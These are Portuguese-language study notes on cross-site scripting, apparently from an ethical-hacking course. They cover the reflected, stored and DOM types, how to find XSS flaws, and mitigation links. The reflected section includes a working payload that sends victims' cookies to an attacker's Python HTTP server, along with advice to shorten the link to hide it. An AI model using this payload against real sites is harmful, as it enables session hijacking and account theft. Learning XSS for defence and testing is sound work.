## O que é?

   - Injeção de código HTML em uma aplicação. Usando, na maioria dos casos, a tag script.


## Onde as falhsa ocorrem?

   - Campos de pesquisa, cadastro são aberturas de comunicação com o servidor. Podendo injetar código javascript na aplicação. 

   - Link gerado pelo hacker com códigos maliciosos, quando abertos por clientes da aplicação, podem enviar dados dele para o atacante. 

   - A falha é executada no browser do cliente (client side).


## Nível de Controle javascript no navegador

   - Basicamente tem acesso a todas as funcionalidades que um script tem, ou seja, controle total do navegador. Com isso, o atacante pode roubar cookies de acesso, sessão de usuário/admin, utilização de keyloggers, explorar falhas em outros plugins.


## Utilizando o XSS Refletido

   - Algumas formas de aproveitar essa vulnerabilidade

   ### Roubo de cookies

      - Basta utilizar a tag script "<script>alert(document.cookie)</script>". Pórem essa forma exibe a ação na tela de quem abrir a URL com o código malicioso.

      - Para ser mais discreto e receber a informação no computador do atacante, é preciso subir um servidor http simples em python, com o comando "python3 -m http.server 80" a porta é a sua escolha, lembrando que não pode haver outro servidor na mesma porta, portanto caso tenha um web server apache na porta 80, comando "sudo service apache2 start", ela deve ser parada com o comando "sudo service apache2 stop". 

      - Então, com o servidor criado, basta colocar no campo de busca da url onde apresenta XSS o script malicioso '<script>new Image().src="http://192.168.200.5/?="+document.cookie</script>' e apertar enter. Lembrando que o ip informado depende da máquina que estiver o servidor http e a porta deve ser a mesma informada na criação do server http. A URL que for informada, terá o cookie de acesso informado no servidor http. Com isso, se o cliente clicar no link e logar, o script enviará o cookie de acesso para o log do servidor que foi criado. 

      - Para melhorar ainda mais o ataque, é possível encurtar a url com um encurtador de url na internet para que fique menos evidente que o script malicioso será executado. 


## Utilizando o XSS Permanente (stored)

   - Esse tipo de cross-site script é mais perigoso que o refletido, pois não depende do cliente acessar um link que o atacante criou. No XSS Stored, o script malicioso fica armazenado na base de dados do servidor, portanto, quando qualquer usuário acessar determinada url de um site o javascript será executado.

   - Essa vulnerabilidade pode acontecer em campos de comentários em postagens de sites. As falhas serão exploradas nos campos de nome e comentário.  

   - Uma forma bem prática de testar essa vulnerabilidade é com a utilização do OWASP ZAP e arquivos de payload, contendo diversas formas de escrever a tag script buscando alguma brecha de segurança. 


## Utilizando o XSS DOM (Document Object Model)

   - Esse XSS mexe na documentação da página html. O DOM não javascript, mas pode ser manipulado pelo js.

   - Caso uma página web manipule o DOM, é possível mudar como o js o manipula. 

   - Os parâmetros são passados pela URL e caso o site tenha essa vulnerabilidade o script terá acesso privilegiado a partir de certas funções de javascript. 

   - eval() é uma função de propriedades de um objeto global, exemplo de função onde pode ser explorado o XSS DOM. 

   - document.write(), document.cookie são exemplos de comandos que manipulam o DOM. 

   - Assim como o XSS reflected, o link malicioso deve ser clicado pelo alvo.


## Como encontrar falhas XSS

   - Três etapas:
      - Localizar entrada de dados - campos para digitar nome, comentário, qualquer coisa que se comunica com o servidor através de GET/POST do protocolo HTTP. 
      - Entender retorno ao usuário - observar o source da página, identificar como o site lida com as tentativas de XSS.
      - Utilizar payloads - payloads para testar várias formas de escrever um XSS em campos possivelmente vulnerável.


## Como mitigar o ataque XSS

   - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

   - site ótimo que descreve em detalhes como se previnir do XSS. 

   - Importante para hacker ético entender como preveni essa vulnerabilidade para saber como os sites seguros se protegem contra XSS.


## Observações

   - Importante checar a source page, para analisar o html, como ele é descrito. 

   - payload xss: existe na internet diversas formas diferente de tentar burlar a segurança do site com xss. Esse payload tem escritas diferentes de tags script que testam essa vulnerabilidade. 

   - Alguns sites limitam a quantidade de caracteres de um comentário, limitando as possibilidades de criar scripts um pouco maiores. Porém, como a página é html, podemos mudar a quantidade de caracteres aceito inspecionando a página. Se o site for seguro, ele limitará a quantidade de caracteres enviados para o servidor e quebrará a tag script criada pelo atacante.

   - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet. Site ótimo para buscar diversos scripts para serem testados em sites com XSS.